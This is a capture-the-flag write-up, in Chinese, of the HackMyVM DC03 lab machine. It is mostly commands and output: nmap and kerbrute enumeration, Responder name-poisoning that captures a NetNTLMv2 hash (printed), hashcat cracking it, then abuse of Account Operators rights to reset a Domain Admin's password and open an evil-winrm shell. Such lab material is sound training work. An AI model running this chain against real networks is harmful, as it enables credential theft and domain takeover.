---
title: HackMyVM-DC03
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# DC03.

> https://hackmyvm.eu/machines/machine.php?vm=DC03
> 

Notes: **Something realistic i think. U tell me.**

## 前期踩点

`nmap`扫描，`126`是靶机

```bash
⚡ root@kali  ~  nmap -sP 192.168.56.0/24    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 01:51 EST
Nmap scan report for 192.168.56.1
Host is up (0.00044s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00026s latency).
MAC Address: 08:00:27:C9:BF:B4 (Oracle VirtualBox virtual NIC)
Nmap scan report for SOUPEDECODE.LOCAL (192.168.56.126)
Host is up (0.00040s latency).
MAC Address: 08:00:27:21:0C:DA (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 28.00 seconds
```

```bash
⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 192.168.56.126            
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 01:52 EST
Nmap scan report for SOUPEDECODE.LOCAL (192.168.56.126)
Host is up (0.00099s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
MAC Address: 08:00:27:21:0C:DA (Oracle VirtualBox virtual NIC)
```

```bash
⚡ root@kali  ~  nmap -sT -A -T4 -O -p 445,389 192.168.56.126
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 01:53 EST
Nmap scan report for SOUPEDECODE.LOCAL (192.168.56.126)
Host is up (0.00084s latency).

PORT    STATE SERVICE       VERSION
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)                           
445/tcp open  microsoft-ds?
MAC Address: 08:00:27:21:0C:DA (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-02-15T21:53:39
|_  start_date: N/A
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:21:0c:da (Oracle VirtualBox virtual NIC)
|_clock-skew: 14h59m58s

TRACEROUTE
HOP RTT     ADDRESS
1   0.84 ms SOUPEDECODE.LOCAL (192.168.56.126)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.08 seconds
```

没有`http`服务，得到域名添加到`hosts`文件

## SMB - 1

先看`SMB`是否可以使用匿名帐户登录

```bash
⚡ root@kali  ~  smbclient -L 192.168.56.126 -U soupedecode.local/anonymous
Password for [SOUPEDECODE.LOCAL\anonymous]:
session setup failed: NT_STATUS_LOGON_FAILURE
```

## 域用户枚举 （兔子洞）

没有什么信息，进行域用户枚举，使用`kerbrute`

```bash
⚡ root@kali  ~/Desktop/Tools  ./kerbrute_linux_amd64 userenum --dc 192.168.56.126 -d SOUPEDECODE.LOCAL ~/Desktop/Dict/SecLists-2024.3/Usernames/xato-net-10-million-usernames.txt          

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev () - 02/15/25 - Ronnie Flathers @ropnop

2025/02/15 02:56:18 >  Using KDC(s):
2025/02/15 02:56:18 >   192.168.56.126:88

2025/02/15 02:56:18 >  [+] VALID USERNAME:       charlie@SOUPEDECODE.LOCAL
2025/02/15 02:56:18 >  [+] VALID USERNAME:       Charlie@SOUPEDECODE.LOCAL
2025/02/15 02:56:18 >  [+] VALID USERNAME:       administrator@SOUPEDECODE.LOCAL
2025/02/15 02:56:20 >  [+] VALID USERNAME:       Administrator@SOUPEDECODE.LOCAL
2025/02/15 02:56:21 >  [+] VALID USERNAME:       CHARLIE@SOUPEDECODE.LOCAL
2025/02/15 02:58:52 >  [+] VALID USERNAME:       wreed11@SOUPEDECODE.LOCAL
2025/02/15 03:04:20 >  [+] VALID USERNAME:       printserver@SOUPEDECODE.LOCAL
2025/02/15 03:09:29 >  [+] VALID USERNAME:       kleo2@SOUPEDECODE.LOCAL
2025/02/15 03:15:20 >  [+] VALID USERNAME:       dc01@SOUPEDECODE.LOCAL
```

将用户名保存到`user.txt`，使用`crackmapexec` 找是否存在弱密码用户，没有存在

```bash
⚡ root@kali  ~/Desktop/test/DC03  crackmapexec smb 192.168.56.126 -u user.txt -p user.txt --continue-on-success --no-bruteforce
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\charlie:charlie STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\Charlie:Charlie STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\administrator:administrator STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\CHARLIE:CHARLIE STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\printserver:printserver STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\kleo2:kleo2 STATUS_LOGON_FAILURE 
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\dc01:dc01 STATUS_LOGON_FAILURE 
```

## Responder

再`Kali`上抓包，看见存在靶机在发送`MDNS`请求

`192.168.56.126` 正在发送 `mDNS` 查询，例如 `A FileServer.local`，这表明该设备正在尝试解析 `.local` 域名

![image.png](image%20103.png)

使用`Responder`来毒害 `responder -I eth1 -wd`

```bash
 root@kali  ~/Desktop/test/DC03  responder -I eth1 -wd                                   
                                         __                                                     
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.                                        
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|                                        
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|                                          
                   |__|                         
                                                                                                                                                                                                           NBT-NS, LLMNR & MDNS Responder 3.1.5.0                                                                                                                                                                                                                                                                                                                                                 To support this project:                                                                                                                                                                      
  Github -> https://github.com/sponsors/lgandx  
  Paypal  -> https://paypal.me/PythonResponder
  ....
  [+] Listening for events...                                                                                                                                                                     
                                                                                                                                                                                                
[*] [NBT-NS] Poisoned answer sent to 192.168.56.126 for name FILESERVER (service: File Server)                                                                                                  
[*] [LLMNR]  Poisoned answer sent to 192.168.56.126 for name FileServer                                                                                                                         
[*] [MDNS] Poisoned answer sent to 192.168.56.126  for name FileServer.local                                                                                                                    
[*] [MDNS] Poisoned answer sent to fe80::dd4d:c480:d553:6413 for name FileServer.local          
[*] [LLMNR]  Poisoned answer sent to fe80::dd4d:c480:d553:6413 for name FileServer              
[*] [MDNS] Poisoned answer sent to 192.168.56.126  for name FileServer.local                    
[*] [LLMNR]  Poisoned answer sent to 192.168.56.126 for name FileServer                         
[*] [MDNS] Poisoned answer sent to fe80::dd4d:c480:d553:6413 for name FileServer.local          
[*] [LLMNR]  Poisoned answer sent to fe80::dd4d:c480:d553:6413 for name FileServer              
[SMB] NTLMv2-SSP Client   : fe80::dd4d:c480:d553:6413                                           
[SMB] NTLMv2-SSP Username : soupedecode\xkate578
[SMB] NTLMv2-SSP Hash     : xkate578::soupedecode:ca95e6d0aa430c62:8B512E10179B3FB25A14B93A6C9F59B5:010100000000000080BE8C195A7FDB0165AF79A641F2CB28000000000200080033004D0037004F0001001E00570049004E002D00540050005200330059004200440054004A004E00460004003400570049004E002D00540050005200330059004200440054004A004E0046002E0033004D0037004F002E004C004F00430041004C000300140033004D0037004F002E004C004F00430041004C000500140033004D0037004F002E004C004F00430041004C000700080080BE8C195A7FDB0106000400020000000800300030000000000000000000000000400000EAC8058D7BFBA6470EC09C40DAB5EACCEBBCB9535C70E24094CF6AC5AD46C97D0A0010000000000000000000000000000000000009001E0063006900660073002F00460069006C0065005300650072007600650072000000000000000000    
```

可以看到靶机一直在请求`FileServer` 的域名，`Responder`响应了靶机的请求，使其将 `FILESERVER` 名称解析到攻击者的 `IP` 地址，并且抓到呢`xkate578`用户的`net NTLM hash`

使用`hashcat`来爆破捕获到的`NTLMv2-SSP Hash`

```bash
 ⚡ root@kali  ~/Desktop/test/DC03  hashcat -h | grep NTLM            
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol         
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol         
   5600 | NetNTLMv2                                                  | Network Protocol         
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System         
 ⚡ root@kali  ~/Desktop/test/DC03  hashcat -m 5600 '< NTLMv2-SSP Hash >' /usr/share/wordlists/rockyou.txt                    
```

![image.png](image%20104.png)

得到一对账号`xkate578:jesuschrist`

## SMB - 2

获得账号密码后再去`SMB` 服务获取信息

```bash
⚡ root@kali  ~/Desktop/test/DC03  smbclient -L 192.168.56.126 -U SOUPEDECODE.LOCAL/xkate578%jesuschrist    

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        share           Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.56.126 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

在`share`文件夹下发现`UserFlag`

```bash
⚡ root@kali  ~/Desktop/test/DC03  smbclient //192.168.56.126/share -U SOUPEDECODE.LOCAL/xkate578%jesuschrist
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Aug  1 02:06:14 2024
  ..                                  D        0  Thu Aug  1 01:38:08 2024
  desktop.ini                       AHS      282  Thu Aug  1 01:38:08 2024
  user.txt                            A       70  Thu Aug  1 01:39:25 2024

                12942591 blocks of size 4096. 10929469 blocks available
```

```bash
⚡ root@kali  ~/Desktop/test/DC03  cat user.txt                                                                                 
12f54a96f64443246930da001cafda8b
```

然后经过一系列的尝试，比如`Kerberoasting`和`ASP_REQ Roasting` ,还有`evil-winrm` 都已失败告终

## 查看用户信息

> 工具 ： https://github.com/the-useless-one/pywerview
> 

查看用户信息

```bash
⚡ root@kali  ~/Desktop/Tools/pywerview  pywerview get-netuser -w soupedecode.local --dc-ip 192.168.56.126 -u xkate578 -p jesuschrist --username xkate578
objectclass:           top, person, organizationalPerson, user
cn:                    Xenia Kate                                                               
sn:                    Kate                                                                     
l:                     Springfield                                                              
st:                    NY                                                                       
title:                 Analyst                                                                  
description:           Adventure seeker and extreme sports fan
postalcode:            81335                
telephonenumber:       719-5053                                                                 
givenname:             Xenia 
initials:              XK            
distinguishedname:     CN=Xenia Kate,CN=Users,DC=SOUPEDECODE,DC=LOCAL
instancetype:          4                                                                        
whencreated:           2024-06-15 20:04:39+00:00                                                
whenchanged:           2025-02-16 00:32:01+00:00                                                
displayname:           Xenia Kate
usncreated:            16902                                                                    
memberof:              CN=Account Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL
usnchanged:            45086                                                                    
department:            Sales                                                                    
company:               CompanyC                                                                 
streetaddress:         123 Elm St
name:                  Xenia Kate                                                               
objectguid:            {f5dee86d-8f4e-4591-8446-0250d6e4bf92}                                   
useraccountcontrol:    NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
badpwdcount:           0  
codepage:              0             
countrycode:           0         
badpasswordtime:       1601-01-01 00:00:00+00:00                                    
lastlogoff:            1601-01-01 00:00:00+00:00                                                
lastlogon:             2025-02-16 00:32:01.361403+00:00                                                                                                                                         
logonhours:            ffffffffffffffffffffffffffffffffffffffffff...
pwdlastset:            2024-08-01 05:37:18.874022+00:00  
primarygroupid:        513                      
objectsid:             S-1-5-21-2986980474-46765180-2505414164-1182                                                                                                                             
admincount:            1       
accountexpires:        1601-01-01 00:00:00+00:00 
logoncount:            6                                                                        
samaccountname:        xkate578                                                                                                                                                                 
samaccounttype:        805306368                                                                
userprincipalname:     xkate578@soupedecode.local                                               
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=SOUPEDECODE,DC=LOCAL             
dscorepropagationdata: 2024-08-01 05:47:50+00:00, 1601-01-01 00:00:00+00:00                     
lastlogontimestamp:    2025-02-16 00:32:01.361403+00:00                                         
mail:                  xkate578@soupedecode.local                               
```

从`memberof: CN=Account Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL` 中可以看到用户属于`Account Operators` 组

## 提权

我们是`Account Operators` 组的成员，拥有**向用户授予有限的帐户创建权限**

可以修改大多数类型的账户，可以管理本地用户和组，但不具备修改管理员组或全局组成员身份的权限

现在是要寻找

列出管理组的成员，可以看到成员包括一个组`Operators` 和`administrator` 用户

```bash
⚡ root@kali  ~/Desktop/Tools/pywerview  pywerview get-netgroupmember -w soupedecode.local --dc-ip 192.168.56.126 -u xkate578 -p jesuschrist --group "Domain Admins"
groupdomain:  SOUPEDECODE.LOCAL
groupname:    Domain Admins
membername:   Operators
memberdomain: SOUPEDECODE.LOCAL
isgroup:      True
memberdn:     CN=Operators,CN=Users,DC=SOUPEDECODE,DC=LOCAL
objectsid:    S-1-5-21-2986980474-46765180-2505414164-2165 

groupdomain:  SOUPEDECODE.LOCAL
groupname:    Domain Admins
membername:   Administrator
memberdomain: SOUPEDECODE.LOCAL
isgroup:      False
memberdn:     CN=Administrator,CN=Users,DC=SOUPEDECODE,DC=LOCAL
objectsid:    S-1-5-21-2986980474-46765180-2505414164-500 
```

跟进`Operators` ，能发现存在 `fbeth103` 。

然后`fbeth103` 属于`Operators` 组，而`Operators` 又属于`Domain Admins`组，那么`fbeth103` 就拥有`Domain Admins`组的权限。

`Account Operators` 组能够修改 `fbeth103` 用户的账户信息，即使 `fbeth103` 属于 `Operators` 组，而 `Operators` 组又是 `Domain Admins` 组的成员

```bash
⚡ root@kali  ~/Desktop/Tools/pywerview  pywerview get-netgroupmember -w soupedecode.local --dc-ip 192.168.56.126 -u xkate578 -p jesuschrist --group "Operators"    
groupdomain:  SOUPEDECODE.LOCAL
groupname:    Operators
membername:   fbeth103
memberdomain: SOUPEDECODE.LOCAL
isgroup:      False
memberdn:     CN=Fanny Beth,CN=Users,DC=SOUPEDECODE,DC=LOCAL
objectsid:    S-1-5-21-2986980474-46765180-2505414164-1221
```

修改`fbeth103` 的密码（第一次没成功，重新导入后才成功）

通过`imparket`工具包的`changepasswd`

```bash
⚡ root@kali  ~/Desktop/test/DC03/output  changepasswd.py 'SOUPEDECODE.LOCAL/fbeth103@192.168.56.126' -altuser 'xkate578' -altpass 'jesuschrist' -newpass 'hacked!' -no-pass -reset
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Setting the password of SOUPEDECODE.LOCAL\fbeth103 as SOUPEDECODE.LOCAL\xkate578
[*] Connecting to DCE/RPC as SOUPEDECODE.LOCAL\xkate578
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.

```

```bash
 root@kali  ~/Desktop/test/DC03/output  evil-winrm -i 192.168.56.126 -u fbeth103 -p hacked!
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
b8e59a7d4020792c412da75e589ff4fc
```

还可以使用`rpcclient`来修改密码

```bash
⚡ root@kali  ~/Desktop/test/DC03/output  rpcclient -U SOUPEDDECODE.LOCAL/xkate578%jesuschrist 192.168.56.126
rpcclient $> setuserinfo2 fbeth103 23 213121231
rpcclient $> exit
⚡ root@kali  ~/Desktop/test/DC03/output  evil-winrm -i 192.168.56.126 -u fbeth103 -p 213121231
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\fbeth103\Documents>                                                                      
```